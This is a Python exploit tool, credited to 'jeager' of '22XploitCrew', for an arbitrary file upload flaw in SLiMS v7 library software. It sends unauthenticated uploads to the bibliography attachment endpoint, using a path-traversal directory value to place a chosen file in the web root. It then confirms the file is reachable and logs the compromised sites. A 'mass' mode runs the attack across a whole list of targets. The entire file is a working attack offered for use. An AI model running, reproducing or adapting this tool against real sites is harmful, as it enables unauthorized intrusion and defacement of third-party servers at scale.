import os, sys, time, argparse, requests
from urllib.parse import urlparse
from colorama import Fore


class Slims():
  def __init__(self):
    self.w = Fore.WHITE
    self.g = Fore.GREEN
    self.b = Fore.BLUE
    self.r = Fore.RED
    self.y = Fore.YELLOW
    self.c = Fore.CYAN
    self.headers = {
      'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'
    }
    
    parser = argparse.ArgumentParser(prog='Slims Exploit', usage="\nsingle: --target <url> --filetxt <file.txt> --method single\nmass: --target <target.txt> --filetxt <file.txt> --method mass", description="Content Management System Slims v7 | Arbritrary file upload")
    parser.add_argument('-v', '--version', action='version', version="%(prog)s 1.0")
    parser.add_argument('-t', '--target', type=str, help="Your target url/list [target.txt]")
    parser.add_argument('-f', '--filetxt', type=str, help="Your file for upload [.txt]")
    parser.add_argument('-m', '--method', help='Method attack(single/mass)')
    args = parser.parse_args()
    
    
    if args.target is not None:
      if args.method == "single":
        self.baner()
        self.single(args.target, args.filetxt)
      elif args.method == "mass":
        self.baner()
        self.mass(args.target, args.filetxt)
      elif args.method == None:
        print(self.w+"Usage single: --target <url> --file <file.txt> --method single\nUsage mass: --target <target.txt> --filetxt <file.txt> --method mass")
      else:
         print(self.w+"Method '"+args.method+"' not found but just single/mass")
    else:
      print("Usage single: --target <url> --method single\nUsage mass: --target <target.txt> --filetxt <file.txt> --method mass")

  def single(self, target, filetxt):
    url_parse = urlparse(target)
    if url_parse.scheme == "":
      print(self.w+"Your url in valid")
      sys.exit()
     
    if url_parse.path == "":
      data = {
        'fileTitle':'Upload by jeager',
        'fileDir':'../',
        'upload':'Unggah Sekarang'
      }
    elif url_parse.path == "/":
      data = {
        'fileTitle':'Upload by jeager',
        'fileDir':'../',
        'upload':'Unggah Sekarang'
      }
    else:
      data = {
        'fileTitle':'Upload by jeager',
        'fileDir':'../../',
        'upload':'Unggah Sekarang'
      }
      
    try:
      files = {
        'file2attach':open(filetxt, 'r')
      }
    except:
      print(self.w+"file '"+str(filetxt)+"' not found")
      sys.exit()
      
    try:
      req = requests.post(target+"/admin/modules/bibliography/pop_attach.php", data=data, files=files, headers=self.headers, timeout=30)
      req2 = requests.get(url_parse.scheme+"://"+url_parse.netloc+"/"+filetxt, headers=self.headers, timeout=30)
      if req2.status_code == 200:
        print(self.w+"["+self.c+"success"+self.w+"] "+url_parse.scheme+"://"+url_parse.netloc+"/"+filetxt)
        with open('results_slims.txt', 'a') as w:
          w.write(url_parse.scheme+"://"+url_parse.netloc+"/"+filetxt+"\n")
      else:
        print(self.w+"["+self.r+"failed"+self.w+"] "+url_parse.scheme+"://"+url_parse.netloc)
    except:
      print(self.w+"["+self.r+"failed"+self.w+"] "+target)
    
  def mass(self, target, filetxt):
    for url_list in open(target, 'r').readlines():
        url_list = url_list.strip()
        url_parse = urlparse(url_list)
        if url_parse.path == "":
          data = {
            'fileTitle':'Upload by jeager',
            'fileDir':'../',
            'upload':'Unggah Sekarang'
          }
        elif url_parse.path == "/":
          data = {
            'fileTitle':'Upload by jeager',
            'fileDir':'../',
            'upload':'Unggah Sekarang'
          }
        else:
          data = {
            'fileTitle':'Upload by jeager',
            'fileDir':'../../',
            'upload':'Unggah Sekarang'
          }
        try:
          files = {
            'file2attach':open(filetxt, 'r')
          }
        except:
          print(self.w+"file "+str(filetxt)+" not found")
          sys.exit()
          
        try:
          req = requests.post(url_list+"/admin/modules/bibliography/pop_attach.php", data=data, files=files, headers=self.headers, timeout=30)
          req2 = requests.get(url_parse.scheme+"://"+url_parse.netloc+"/"+filetxt, headers=self.headers, timeout=30)
          if req2.status_code == 200:
            print(self.w+"["+self.c+"success"+self.w+"] "+url_parse.scheme+"://"+url_parse.netloc+"/"+filetxt)
            with open('results_slims.txt', 'a') as w:
              w.write(url_parse.scheme+"://"+url_parse.netloc+"/"+filetxt+"\n")
          else:
            print(self.w+"["+self.r+"failed"+self.w+"] "+url_parse.scheme+"://"+url_parse.netloc)
        except:
          print(self.w+"["+self.r+"failed"+self.w+"] "+url_parse.scheme+"://"+url_parse.netloc+"/"+filetxt)
          
  def baner(self):
    logo = """
    youtube.com/c/learnwithjeager
    ███████╗██╗  ██╗     ███████╗██╗     ██╗███╗   ███╗███████╗
    ██╔════╝╚██╗██╔╝     ██╔════╝██║     ██║████╗ ████║██╔════╝
    █████╗   ╚███╔╝█████╗███████╗██║     ██║██╔████╔██║███████╗
    ██╔══╝   ██╔██╗╚════╝╚════██║██║     ██║██║╚██╔╝██║╚════██║
    ███████╗██╔╝ ██╗     ███████║███████╗██║██║ ╚═╝ ██║███████║
    ╚══════╝╚═╝  ╚═╝     ╚══════╝╚══════╝╚═╝╚═╝     ╚═╝╚══════╝
    """
    print(self.w+logo)
    print(self.w+"      Author: jeager   |   Team: 22"+self.r+"X"+self.w+"ploit"+self.r+"C"+self.w+"rew\n")
    time.sleep(2)
if __name__ == "__main__":
  Slims()